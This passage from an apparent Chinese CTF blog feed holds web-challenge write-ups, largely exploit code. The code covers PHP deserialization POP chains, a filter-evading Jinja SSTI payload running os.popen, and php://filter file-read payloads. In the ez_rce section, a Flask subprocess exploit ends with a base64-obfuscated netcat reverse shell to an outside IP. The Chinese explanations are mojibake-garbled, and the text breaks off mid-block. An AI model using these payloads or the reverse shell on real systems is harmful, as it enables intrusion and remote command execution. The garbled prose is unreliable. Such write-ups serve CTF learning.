class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj = new CTF();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">//O<span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Begin</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Then</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Super</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22Handle</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22CTF</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22handle</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22WhiteGod</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22system</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22var</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22ls</span>+<span class="meta">%2F</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><h2 id="GenShin">GenShin</h2><p>è¿‡æ»¤äº†åŒ{ï¼Œä½¿ç”¨{å’Œ%ç»•è¿‡ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç”¨äº†ä¹‹å‰æŸæ¬¡sstiçš„expç›´æ¥getshelläº†</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(<span class="name">config</span>|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_cla&quot;</span><span class="string">&quot;ss_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_in&quot;</span><span class="string">&quot;it_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_glo&quot;</span><span class="string">&quot;bals_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_get&quot;</span><span class="string">&quot;item_&quot;</span><span class="string">&quot;_&quot;</span>)(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>)|attr(<span class="string">&quot;po&quot;</span><span class="string">&quot;pen&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&quot;re&quot;</span><span class="string">&quot;ad&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="R-C-E">R!!!C!!!E!!!</h2><p>åº”è¯¥å¯ä»¥ç›²æ³¨ï¼Œè¿™é‡Œä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|script result1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl">OtenkiGirl</h2><p>çŒœä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œå­¦ing</p>]]></content>
    
    
    <summary type="html">æ–°æ‰‹èµ›ï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SHCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54fkfh75.html"/>
    <id>https://bowuchuling.github.io/posts/54fkfh75.html</id>
    <published>2023-10-15T09:13:18.233Z</published>
    <updated>2023-10-17T02:25:11.611Z</updated>
    
    <content type="html"><![CDATA[<h1>SHCTF WEEK2</h1><h2 id="WEEK2-serialize">[WEEK2]serialize</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>]));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œååºåˆ—åŒ–å¤´å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œç„¶åç”¨å¼•ç”¨ç»•è¿‡miaomiao()æ–¹æ³•</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;a = &amp;<span class="variable">$a</span>-&gt;ding-&gt;gao;</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">wanna</span><span class="punctuation">[</span><span class="variable">fl</span><span class="operator">.</span><span class="variable">ag</span><span class="operator">=</span><span class="variable">a</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">i</span><span class="operator">:</span><span class="number">0</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;musca&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;ding&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;misca&quot;</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;gao&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;fei&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">8</span><span class="operator">:</span><span class="string">&quot;milaoshu&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;v&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">52</span><span class="operator">:</span><span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;a&quot;</span><span class="operator">;</span><span class="variable">R</span><span class="operator">:</span><span class="number">4</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-no-wake-up">[WEEK2]no_wake_up</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>fast_destruct ç»•è¿‡wakeupï¼Œexpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">try</span>=O:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-rce">[WEEK2]ez_rce</h2><p>æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gett</span>(<span class="params">obj, arg</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, i)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sett</span>(<span class="params">obj, arg, num</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg) - <span class="number">1</span>):</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, arg[i])</span><br><span class="line">    <span class="built_in">setattr</span>(tmp, arg[i + <span class="number">1</span>], num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">giveme, num, bol</span>):</span><br><span class="line">    c = gett(subprocess, giveme)</span><br><span class="line">    tmp = <span class="built_in">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="built_in">tuple</span>(tmp)</span><br><span class="line">    sett(subprocess, giveme, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">arg</span>):</span><br><span class="line">    subprocess.call(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;exec&#x27;</span>) == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.args.get(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            cmd(shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp = <span class="built_in">list</span>(request.get_json()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="built_in">bool</span>(request.args.get(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            hint(exp, num, bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹ï¼š</p><p>1.è¿™é‡Œçš„subprocess.callçš„shellå±æ€§é»˜è®¤ä¸ºfalseï¼Œåªèƒ½æ‰§è¡Œå•ä¸ªå‘½ä»¤</p><p>2.callå’Œrunç­‰å‡½æ•°ä¸€æ ·ï¼Œä»–ä»¬éƒ½æ˜¯ä½¿ç”¨Popenè¿›è¡Œå°è£…çš„ï¼Œè¿è¡Œæ—¶éƒ½ä¼šè°ƒç”¨è¿™ä¸ªï¼Œå‚è€ƒhttps://blog.csdn.net/wzj_110/article/details/116612425</p><p>3.ä½¿ç”¨__defaults__æ–¹æ³•æ˜¯å¯ä»¥è·å¾—æŸå‡½æ•°æˆ–è€…ç±»å†…çš„æ‰€æœ‰å±æ€§</p><p>æ€»ä½“æ€è·¯å°±æ˜¯æ‰¾åˆ°Popené‡Œé¢çš„shellå±æ€§ï¼Œå°†å…¶ä¿®æ”¹ä¸ºtrueï¼Œè¿›è€Œè®©callæ‰§è¡Œå¤šæ®µå‘½ä»¤</p><p>ä¸€é˜¶æ®µpayloadå¦‚ä¸‹:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span></span><br><span class="line">?<span class="attr">num</span><span class="operator">=</span><span class="number">7</span><span class="variable">&amp;bol</span>=<span class="number">1</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">POST:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;exp&quot;</span>:<span class="punctuation">&#123;</span><span class="string">&quot;Popen&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__defaults__&quot;</span>:<span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>äºŒé˜¶æ®µpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">exec</span>=ok&amp;shell=`echo <span class="attribute">bmMgMTEwLjQxLjE3LjE4MyAyNTAgLWUgL2Jpbi9zaA</span>== | base64 -d`</span><br></pre></td></tr></table></figure><h2 id="WEEK2-MD5çš„äº‹å°±æ‹œæ‰˜äº†">[WEEK2]MD5çš„äº‹å°±æ‹œæ‰˜äº†</h2><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹ï¼šå“ˆå¸Œæ‹“å±•é•¿åº¦æ”»å‡»ï¼Œå·¥å…·hashpumpï¼Œä¸‹é¢ä¼šä¸¾ä¾‹è¯´æ˜</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 